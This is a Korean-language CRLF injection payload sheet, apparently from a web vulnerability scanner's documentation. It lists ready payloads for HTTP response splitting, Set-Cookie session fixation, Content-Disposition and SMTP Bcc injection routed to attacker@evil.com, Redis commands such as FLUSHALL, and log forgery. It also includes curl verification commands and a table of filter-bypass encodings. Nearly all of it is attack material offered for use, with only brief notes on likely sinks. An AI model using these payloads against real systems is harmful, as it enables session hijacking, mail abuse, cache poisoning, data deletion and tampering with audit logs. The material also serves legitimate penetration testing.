### 기본 페이로드

#### HTTP 응답 헤더 인젝션 (가장 흔한 sink — Location, Set-Cookie)
- `evil.com%0d%0aInjected-Header:true` (URL parameter, redirect sink)
- `evil.com%0d%0aSet-Cookie:session=fixed` (세션 고정)
- `evil.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>` (HTTP Response Splitting)
- `evil.com%0d%0aLocation:https://attacker.com` (redirect 변조)

#### Set-Cookie 변조 (cookie 주입)
- `lang=ko%0d%0aSet-Cookie:admin=true` (preference sink)
- `name=user%0d%0aSet-Cookie:session=ATTACKER_SESSION; Path=/`

#### Content-Disposition 인젝션 (파일명 sink)
- `filename="x%0d%0aSet-Cookie:x=y.txt"` (multipart upload — file-upload 결합)
- `filename="evil%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>.html"`

#### Outgoing HTTP 요청 헤더 인젝션
- `host=internal.local%0d%0aHost:evil.com` (proxy sink)
- `auth=Bearer%20X%0d%0aX-Admin:true` (header injection in outgoing)

#### SMTP 헤더 인젝션 (메일 발송)
- `email=victim@x.com%0d%0aBcc:attacker@evil.com` (To 헤더 injection)
- `email=victim@x.com%0d%0aSubject:Hacked%0d%0a%0d%0aBody`
- `subject=Hello%0d%0aBcc:attacker@evil.com`

#### LDAP 인젝션 (CRLF in DN)
- `cn=admin%0d%0aobjectClass:groupOfNames` (DN sink)

#### Redis/Memcached 프로토콜 인젝션
- `key=foo%0d%0aFLUSHALL%0d%0a` (Redis 명령 분리)
- `key=foo%0d%0aSET%20admin%201%0d%0a`
- `key=foo%0d%0aDEL%20user:1%0d%0a`

#### HTTP/2 → HTTP/1.1 다운그레이드
```
curl --http2 "https://target/" -H "X-Custom: a%0d%0aInjected:true"
```

#### 로그 인젝션
- `q=user%0d%0a127.0.0.1+-+admin+%5B$(date)%5D+%22GET+/admin+HTTP/1.1%22+200`
- `q=user%0aFAKE_LOG_ENTRY`

#### 검증 확인
```bash
# 응답 헤더에 주입한 헤더 확인
curl -v "https://target/redirect?url=evil%0d%0aInjected:true" 2>&1 | grep -i Injected

# Set-Cookie 인젝션
curl -v "https://target/api/setpref?lang=ko%0d%0aSet-Cookie:admin=true" 2>&1 | grep -i Set-Cookie
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `\r\n` 차단만 | `\n` 단독 (`%0a`), `\r` 단독 (`%0d`) — 일부 서버 LF only 처리 |
| URL-encoded 차단 (`%0d%0a`) | Double encoding `%250d%250a`, Unicode `%E5%98%8A%E5%98%8D` (UTF-8 over-long), `\u000d\u000a`, `%c0%8d%c0%8a` |
| `replace("\\r\\n", "")` | 순차 replace 후 `\n`/`\r` 단독 잔존, `%0d%0a` 사이 다른 문자 삽입 |
| 런타임 내장 방어 (Node 4.6+, PHP 8+) | `res.write()` 같은 raw 작성 시 우회. HTTP/2→HTTP/1.1 변환 gateway 노출 |
| Content-Disposition RFC 5987 | `filename*=UTF-8''...` 미적용 시 원본 filename에 CRLF |
| NULL byte 차단 | `%00`, `%c0%80` (overlong) — 일부 환경 무효화 |
| 헤더값 한 줄 검증 | 헤더 값 끝에 `%20` (공백) + CRLF 추가 — 일부 파서 통과 |
| Whitespace 검증 | TAB (`%09`), VT (`%0b`), FF (`%0c`) 등 다른 whitespace로 변형 |

#### HTTP/2 환경
```
# HTTP/2 헤더값 자체에 CRLF — backend HTTP/1.1 변환 시 인젝션
curl --http2 "https://target/" -H "Foo: a
Smuggled: yes"
```

---

### 참고사항

- Node 4.6+, PHP 8+, Java Servlet 3.1+, Django 1.x+, Flask 0.9+는 런타임 차단 — 레거시 환경 우선 점검
- 패스워드 리셋/이메일 변경/리다이렉트 endpoint가 빈출 sink
- Content-Disposition filename에 사용자 업로드 파일명이 그대로 들어가는 경우 (file-upload-scanner와 결합)
- 메일 발송 코드의 To/Cc/Bcc/Subject 헤더에 사용자 입력 직접 삽입 사례
- HTTP/2 환경에서는 자체 인젝션 불가하나 backend HTTP/1.1 변환 시 노출 — gateway 환경 점검
- Cache poisoning 결합: 변조된 응답이 캐시되어 다른 사용자에게 영향
- 로그 인젝션은 SIEM/모니터링 도구 혼란 유발 (감사 로그 위조)
- Redis/Memcached protocol injection은 키/값에 CRLF 삽입 → 추가 명령 실행 (FLUSHALL 등)
- AWS S3 metadata `x-amz-meta-*`도 사용자 입력 시 CRLF 인젝션 게이트
- nginx/Apache 같은 reverse proxy는 자체 헤더 검증 — 백엔드 reach 전에 차단
- HTTP Response Splitting (CRLF + 본문 추가)은 Reflected XSS와 유사 영향 (xss-scanner 결합)
- session fixation (Set-Cookie 주입)은 인증 컨텍스트 결합 시 영향도 큼
- Outgoing HTTP 요청 (proxy sink)에 CRLF 삽입 시 백엔드 SSRF 변형 가능
- 메일 헤더 인젝션은 SMTP 서버 의존 — 일부는 자체 차단, 일부는 통과
- 응답 헤더 위치별 차이: `Location`은 strict 검증, 커스텀 헤더는 관대한 경우 다수
